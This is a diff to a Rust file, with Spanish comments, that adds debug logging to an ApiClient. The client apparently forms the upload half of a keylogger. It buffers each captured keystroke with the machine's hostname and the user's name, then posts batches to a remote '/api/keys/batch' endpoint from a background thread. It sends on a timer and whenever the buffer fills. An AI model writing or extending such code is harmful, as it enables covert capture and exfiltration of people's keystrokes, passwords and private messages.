@@ -21,6 +21,8 @@ pub struct ApiClient {
 //Metodos de la struct
 impl ApiClient {
     pub fn new(base_url: &str) -> Self {
+        println!("🌐 ApiClient::new() - base_url: {}", base_url);  // <--- LOG
+
         let client = ApiClient {
             client: Client::new(),
             base_url: base_url.to_string(),
@@ -29,12 +31,15 @@ impl ApiClient {
 
         // Iniciar el hilo que envía periódicamente
         client.start_periodic_sender();
+        println!("✅ ApiClient inicializado correctamente");  // <--- LOG
 
         client
     }
 
     /// Agrega una tecla al buffer (no envía inmediatamente)
     pub fn add_key(&self, key: &str, timestamp: &str) -> Result<(), Box<dyn std::error::Error>> {
+        println!("📝 add_key() - key: '{}'", key);  // <--- LOG
+
         let machine = hostname::get()?.to_string_lossy().to_string();
         let user = std::env::var("USER")
             .or_else(|_| std::env::var("USERNAME"))
@@ -50,9 +55,11 @@ impl ApiClient {
         // Agregar al buffer
         let mut buffer = self.buffer.lock().unwrap();
         buffer.push(entry);
+        println!("📊 Buffer actual: {} teclas", buffer.len());  // <--- LOG
 
         // Si el buffer supera el tamaño máximo, enviar inmediatamente
         if buffer.len() >= MAX_BUFFER_SIZE {
+            println!("📤 Buffer lleno, enviando...");  // <--- LOG
             drop(buffer); // Liberar el lock antes de enviar
             let _ = self.flush();
         }
@@ -62,9 +69,12 @@ impl ApiClient {
 
     /// Envía todos los datos del buffer y lo vacía
     pub fn flush(&self) -> Result<(), Box<dyn std::error::Error>> {
+        println!("📤 flush() - iniciando...");  // <--- LOG
+
         let mut buffer = self.buffer.lock().unwrap();
 
         if buffer.is_empty() {
+            println!("📤 flush() - buffer vacío, nada que enviar");  // <--- LOG
             return Ok(());
         }
 
@@ -75,10 +85,13 @@ impl ApiClient {
         println!("📤 Enviando {} teclas al servidor...", count);
 
         let url = format!("{}/api/keys/batch", self.base_url);
+        println!("📤 URL: {}", url);  // <--- LOG
+
         match self.client.post(&url).json(&data).send() {
             Ok(response) => {
+                println!("📤 Respuesta recibida: {}", response.status());  // <--- LOG
                 if response.status().is_success() {
-                    println!(" {} teclas enviadas correctamente", count);
+                    println!("✅ {} teclas enviadas correctamente", count);
                 } else {
                     eprintln!("⚠️ Error HTTP: {}", response.status());
                     // Reintentar: devolver los datos al buffer
@@ -101,6 +114,8 @@ impl ApiClient {
 
     /// Inicia un hilo que envía el buffer periódicamente
     fn start_periodic_sender(&self) {
+        println!("⏰ Iniciando hilo de envío periódico...");  // <--- LOG
+
         let client = self.clone();
         thread::spawn(move || {
             let interval = Duration::from_secs(SEND_INTERVAL_SECONDS);
@@ -110,11 +125,14 @@ impl ApiClient {
                 thread::sleep(Duration::from_millis(1000)); // Revisar cada segundo
 
                 if last_send.elapsed() >= interval {
+                    println!("⏰ Envío periódico...");  // <--- LOG
                     let _ = client.flush();
                     last_send = Instant::now();
                 }
             }
         });
+
+        println!("✅ Hilo de envío periódico iniciado");  // <--- LOG
     }
 }
 
